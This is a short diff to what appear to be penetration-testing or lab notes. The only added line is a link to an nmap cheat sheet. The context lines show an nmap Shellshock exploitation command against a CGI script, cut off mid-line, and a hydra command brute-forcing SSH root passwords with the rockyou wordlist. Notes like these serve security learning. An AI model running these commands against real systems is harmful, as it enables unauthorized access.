@@ -7,3 +7,5 @@ nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=b
 ```
  hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
  ```
+
+https://www.stationx.net/nmap-cheat-sheet/
